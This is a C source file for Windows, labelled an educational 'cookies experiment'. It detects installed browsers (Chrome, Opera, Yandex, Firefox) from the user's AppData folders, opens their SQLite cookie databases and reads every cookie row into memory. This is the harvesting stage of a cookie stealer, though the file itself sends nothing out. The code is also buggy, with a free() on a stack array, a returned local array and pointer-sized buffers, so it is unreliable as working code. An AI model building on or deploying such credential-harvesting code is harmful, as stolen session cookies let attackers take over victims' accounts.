/*
@
    - Browser's cookies experiment field.
    - Was written just in education pourpose.
    ^ I personally don't like the previous version.
@ 
*/

#include "main.h"

#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <sqlite3.h>
#include <windows.h>

#ifndef CH_TYPE
#define CH_TYPE 1

#ifndef FF_TYPE
#define FF_TYPE 2

#endif
#endif


/* Global cookie datatype array offset for callback 
*/
uint32_t offset = 0;


int main(void)
{
    char  username[50];
    DWORD username_size = sizeof(username);

    if (!(GetUserName (username, &username_size)))
        return -1;

    uint16_t user_path_size = strlen("C:\\Users\\\\");
    char     user_path[username_size + strlen(username)];

    /* Set local user path. */
    sprintf(user_path, "C:\\Users\\%s\\", username);

    uint16_t local_path_s, roaming_path_s;
    local_path_s   = user_path_size + strlen("AppData\\Local\\");
    roaming_path_s = user_path_size + strlen("AppData\\Roaming\\");

    char roaming_path[roaming_path_s];
    char local_path[local_path_s];

    /* Get and set roaming and local pathes. */
    sprintf(roaming_path, "%sAppData\\Roaming\\", user_path);
    sprintf(local_path, "%sAppData\\Local\\", user_path);


    /* Here we'll check what browsers are installed already. */
    browser_prediction local_machine;
    local_machine = check_browsers(local_path, roaming_path);
    local_machine.user_path = user_path;

    /* Output status for test pourpose. */
    printf("FF: %d\nCH: %d\nOP: %d\nYA: %d\n", 
        local_machine.FF, local_machine.CH,
        local_machine.OP, local_machine.YA);

    struct cookies_datatype* local_container = collect_data(local_machine);

    /* for (int i = 0; i < offset; i++)
        printf("host: %s\nvalue: %s\n", 
            local_container[i].host,
            local_container[i].value);
            */

    return 0;
}


/* Reads directory and puts it's files in the array of char*'s.
*/
void dir_reader(const char* directory, char** files)
{
    DIR           *dir;
    struct dirent *entry;

    if ((dir = opendir(directory)) != NULL)
    {
        int i = 0;
        for (; (entry = readdir(dir)) != NULL; i++)
        {
            files[i] = (char *)malloc(sizeof(entry->d_name));
            strcpy(files[i], entry->d_name);
        }
        closedir(dir);
        files[i] = NULL;
    }
    else
        files[0] = NULL;
}


/* Check if some file is in directory or not.
*/
uint8_t check_file_in_dir(char* filename, const char* dir)
{
    char* files[50];
    dir_reader(dir, files);

    if (files[0] == NULL)
        return 0;

    for (int i = 0; files[i]; i++)
        if (!(strcmp(filename, files[i])))
        {
            free(files);
            return 1;
        }

    free(files);
    return 0;
}


/* Will check an avaible browsers on this local machine.
   Type browser_prediction defined in 'main.h'.
*/
browser_prediction check_browsers(char* local, char* roaming)
{
    browser_prediction status;
    status.FF = check_file_in_dir("Mozilla", roaming);
    status.CH = check_file_in_dir("Google", local);
    status.OP = check_file_in_dir("Opera Software", roaming);
    status.YA = check_file_in_dir("Yandex", local);

    return status;
}


/* Collect SQL data from databases of browser's cookies.
*/
struct cookies_datatype* collect_data(browser_prediction status)
{
    struct cookies_datatype local_container[256];
    char* u_path = status.user_path;
    char* full_path = malloc(sizeof(u_path) + sizeof(YA_PATH) + 1);

    //if (status.FF)
        //get_sql(&local_container, FF_PATH, FF_TYPE);

    if (status.CH)
    {
        sprintf(full_path, "%s%s", u_path, CH_PATH);
        get_sql(local_container, full_path, CH_TYPE);
    }

    if (status.OP)
    {
        sprintf(full_path, "%s%s", u_path, OP_PATH);
        get_sql(local_container, full_path, CH_TYPE);
    }

    if (status.YA)
    {
        sprintf(full_path, "%s%s", u_path, YA_PATH);
        get_sql(local_container, full_path, CH_TYPE);
    }

    free(full_path);

    return local_container;
}


/* Callback function for SQL request to the database.
*/
static int callback(struct cookies_datatype* cont, int argc, char **argv, char **colname)
{
    if (offset >= 256) return 0;
    int i = 0;
    for (; i < argc; i++)
    {
        cont[i+offset].value  = argv[i] ? argv[i] : "NULL";
        cont[i+offset].host   = colname[i];
        cont[i+offset].b_type = 1; 

        printf("%s\n", cont[i+offset].host);
    }
    offset += i;

    return 0;
}


/* Will get data from SQL database and 'll put it in container.
*/
void get_sql(struct cookies_datatype* cont, const char* sql_path, uint8_t bt)
{
    sqlite3* database;
    char* err = 0;
    int s_code;
    const char request[30];

    s_code = sqlite3_open(sql_path, &database);

    if (bt == CH_TYPE) {
        strcpy(request, "SELECT * from cookies");
    } 
    else if (bt == FF_TYPE) {
        strcpy(request, "SELECT * from moz_cookies");
    } 
    else {
        return;
    }

    s_code = sqlite3_exec(database, request, callback, cont, &err);
    sqlite3_close(database);
}
